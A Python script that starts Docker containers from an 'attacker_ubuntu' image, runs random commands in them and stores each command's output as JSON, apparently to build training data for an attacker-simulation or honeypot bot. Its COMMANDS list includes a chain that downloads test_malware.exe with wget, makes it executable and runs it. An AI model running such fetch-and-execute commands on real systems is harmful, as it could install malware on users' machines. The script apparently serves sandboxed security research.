import docker
import random
import json
import pandas as pd
from datetime import datetime

COMMANDS = [
    "wget https://github.com/zauzooz/test_malware/raw/master/test_malware.exe",
    "ls",
    "chmod +x test_malware.exe",
    "./test_malware.exe"
]

SEED=42


# JUNKS = [
#     "echo "
# ]

COL_NAMES = ["command", "output"]

DIR_PATH = "trainBot/"

def trainset_generator(n_samples: int):

    SEED = random.randint(42, 1000)  # Generate a new seed for each call

    def command_list_generator():
        command_list = []

        n_commands = random.randint(1, 10)
        command_list += random.choices(COMMANDS, k=n_commands)

        return command_list

    if n_samples <= 0:
        raise "n_samples must be larger than 0."
    
    random.seed(SEED)  # Reseed the random number generator

    client = docker.from_env()
    for i in range(n_samples):
        print(f"SAMPLE [{i}]")
        container = client.containers.run('attacker_ubuntu', tty=True, stdin_open=True, detach=True)

        command_list = []

        command_list = command_list_generator()

        # command_list = COMMANDS.copy()

        print(command_list)
        
        data = {}
        
        i = 0

        for cmd in command_list:
            # print(f"$ {cmd}")
            output = container.exec_run(cmd)
            output = output.output.decode('utf-8')
            # print(f"{output}")
            data[i] = {
                "cmd": cmd,
                "output": output
            }
            i += 1

        # Get the current datetime
        now = datetime.now()

        # Format the datetime as "d-m-y_h-m-s-ms"
        formatted_datetime = now.strftime("%d-%m-%y_%H-%M-%S-%f")

        json.dump(
            data, 
            open(f"trainBot/trainset/data_{formatted_datetime}.json", "w"),
            indent=6
            )

        # stop container

        container.stop()
        # remove container, that refresh container.
        container.remove()

if __name__ == "__main__":
    trainset_generator(20)